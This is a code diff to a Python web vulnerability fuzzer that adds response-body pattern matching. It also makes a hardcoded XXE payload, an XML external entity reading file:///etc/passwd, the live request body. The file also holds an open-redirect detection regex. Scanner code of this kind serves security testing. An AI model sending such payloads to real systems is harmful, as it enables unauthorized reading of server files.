@@ -22,7 +22,7 @@ class Fuzzer:
 
 
     def scan(self, payload):
-        global responseheaders,status
+        global responseheaders,status,responsebody
         http=urllib3.PoolManager()
         url=f'{self.url}/{payload}',
         r=http.request(
@@ -34,6 +34,7 @@ class Fuzzer:
         print(f'{url} {r.status}')
         responseheaders=r.headers
         #print(responseheaders)
+        responsebody=r.data
         status=r.status
         self.checkers()
         
@@ -63,6 +64,14 @@ class Fuzzer:
                         reg=r"(?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]*)example\.com\/?(\/|[^.].*)?$"
                         regmatch=Engine.regex_match(self,reg,head)
                         print(f"Pattern found : {regmatch}")
+                
+                if matcher['part']=='body':
+                   # print(responsebody)
+                    reg=matcher['regex']
+                    b=responsebody.decode('utf-8')
+                    regmatch=Engine.regex_match(self,reg,b)
+                    print(f"Pattern found : {regmatch}")
+
         self.matchersCondition(flag,regmatch)
 
 
@@ -141,9 +150,9 @@ class Engine(Fuzzer):
 
 
     def req(self):
-        global status,responseheaders,flag
+        global status,responseheaders,flag,responsebody
 
-        #body='''<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'''
+        body='''<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'''
         
         http=urllib3.PoolManager()
         print(f"payloads : {data['request']['payloads']}")
@@ -161,15 +170,17 @@ class Engine(Fuzzer):
                 data['request']['method'],
                 url=self.url,
                 headers=data['request']['headers'],
-                body=data['request']['body']
+                body=body
+               # body=data['request']['body']
             )
       #  print(r.headers)
         status=r.status
-        print(status)
         responseheaders=r.headers
-        print(responseheaders)
-        print(r.data)
-       # self.checkers()
+        responsebody=r.data
+        print(status)
+      #  print(responseheaders)
+       # print(r.data)
+        self.checkers()
  
 
     def regex_match(self,regex, string):
